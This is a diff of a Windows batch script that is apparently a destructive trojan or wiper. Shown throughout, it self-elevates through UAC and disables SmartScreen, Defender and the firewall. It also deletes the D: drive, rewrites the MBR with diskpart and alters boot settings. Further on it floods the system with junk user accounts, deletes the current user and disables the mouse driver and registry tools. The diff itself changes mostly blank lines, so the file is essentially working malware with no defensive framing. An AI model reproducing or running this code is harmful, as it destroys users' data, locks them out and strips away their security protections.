@@ -1,11 +1,9 @@
 @echo off
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges to continue...
     goto UACPrompt
 ) else ( goto gotAdmin )
-
 :UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     set params = %*:"="
@@ -14,11 +12,9 @@ if '%errorlevel%' NEQ '0' (
     "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
     exit /B
-
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-
 takeown /f "%systemroot%\System32\smartscreen.exe" /a
 icacls "%systemroot%\System32\smartscreen.exe" /reset
 taskkill /im smartscreen.exe /f
@@ -26,7 +22,6 @@ icacls "%systemroot%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 dir d:
 echo Y|del D:\
-
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 net stop “Security Center”
 netsh firewall set opmode mode=disable
@@ -153,16 +148,12 @@ if "%result%" == "SUCCESS: The operation completed successfully." (
 ) else (
     goto error
 )
-
 :start
 rem Stop the Windows Defender service
 sc stop WinDefend
-
 echo The Windows Defender service has been stopped.
-
 :error
 echo You do not have sufficient privileges to stop the Windows Defender service.
-
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
 bcdedit /set {default} bootstatuspolicy ignoreallfailures
@@ -191,28 +182,19 @@ attrib +h +s +r startup.bat
 if not "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITECTURE%"=="x86" goto error
 if "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITEW6432%"=="" goto error
 if "%PROCESSOR_ARCHITECTURE%"=="x86" if "%PROCESSOR_ARCHITEW6432%"=="" goto error
-
 if not exist "%SystemRoot%\System32\diskpart.exe" goto error
-
 "%SystemRoot%\System32\diskpart.exe" /s mbr.txt
-
 :success
 echo The MBR has been rewritten successfully.
-
 :error
 echo You do not have sufficient privileges or the diskpart utility is not available.
-
 set IMAGE_FILE=C:\Users\User\Desktop\boot_screen.bmp
 set KEY_FILE=C:\Users\User\Desktop\boot_screen_key.reg
-
 reg export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background %KEY_FILE%
-
 findstr /v "OEMBackground" %KEY_FILE% > %KEY_FILE%.tmp
 echo OEMBackground=dword:00000001 >> %KEY_FILE%.tmp
 move /Y %KEY_FILE%.tmp %KEY_FILE% > nul
-
 reg import %KEY_FILE%
-
 reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background /v OEMBackground /t REG_SZ /d %IMAGE_FILE% /f
 net user %random% %random% /add
 net user %random% %random% /add
@@ -252,12 +234,9 @@ net user wenomechainsamaversion2 troll /add
 net user 𝓽𝓻𝓸𝓳𝓪𝓷 death /add
 net user %USERNAME% /delete
 start sc.vbs
-rem ---------------------------------
-rem Disable Mouse
 set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
 reg delete %key%
 reg add %key% /v Start /t REG_DWORD /d 4
-rem ---------------------------------
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
 attrib -r -s -h c:autoexec.bat
 del c:autoexec.bat
